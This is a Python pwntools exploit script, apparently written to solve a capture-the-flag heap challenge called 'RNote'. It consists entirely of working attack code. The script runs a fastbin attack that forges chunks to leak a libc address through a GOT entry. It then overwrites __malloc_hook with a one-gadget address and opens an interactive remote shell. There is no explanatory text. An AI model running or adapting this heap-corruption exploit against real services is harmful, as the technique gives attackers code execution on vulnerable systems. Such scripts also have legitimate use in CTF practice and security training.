#!/usr/bin/env python
import sys, os
from pwn import *

HOST, PORT = (sys.argv[1], sys.argv[2]) if len(sys.argv) > 2 else ('localhost', 5566)
elf = ELF('RNote'); context.word_size = elf.elfclass
with context.local(log_level='ERROR'):
    libc = ELF('libc.so.6') if os.path.exists('libc.so.6') else elf.libc
if not libc: log.warning('Cannot open libc.so.6')

def add(size, title, content):
    r.sendlineafter('choice: ', '1')
    r.sendlineafter('size: ', str(size))
    r.sendlineafter('title: ', title)
    r.sendlineafter('content: ', content)

def delete(idx):
    r.sendlineafter('choice: ', '2')
    r.sendlineafter('delete: ', str(idx))

def show(idx):
    r.sendlineafter('choice: ', '3')
    r.sendlineafter('show: ', str(idx))

r = remote(HOST, PORT)
pause()

# fastbin attack to leak libc
fake = flat(0, 0x41, 'a'*0x30) + flat(0, 0x71, 'a'*0x60)
add(0x80, '0', '')
add(0x100,'1', 'a'*0x50 + fake)
add(0x80, '2'.ljust(0x10), '')
delete(2)
delete(1)
got = 0x60201a 
fake = flat(0, 0x41, got)
add(0x100,'1', 'a'*0x50 + fake)
add(0x30, '2', '')
add(0x30, '3', '')
show(3)
r.recvuntil('content: \n')
r.recv(5)
libc_base = u64(r.recv(8)) - libc.sym['write']
log.info('libc_base: {}'.format(hex(libc_base)))
libc.address += libc_base

# fastbin attack to overwrite __malloc_hook
fake = flat(0, 0x71, 'a'*0x60) + flat(0, 0x41, 'a'*0x30)
add(0x80, '4', '')
add(0x100,'5', 'a'*0x20 + fake)
add(0x80, '6'.ljust(0x10), '')
delete(6)
delete(5)
fake = flat(0, 0x71, libc.sym['__malloc_hook'] - 0x23)
add(0x100,'5', 'a'*0x20 + fake)
add(0x60, '6', '')
fuck = libc_base + 0xf0567
add(0x60, '7', 'a'*0x13 + p64(fuck))

r.sendlineafter('choice: ', '1')
r.sendlineafter('size: ', str(0x20))

r.interactive()
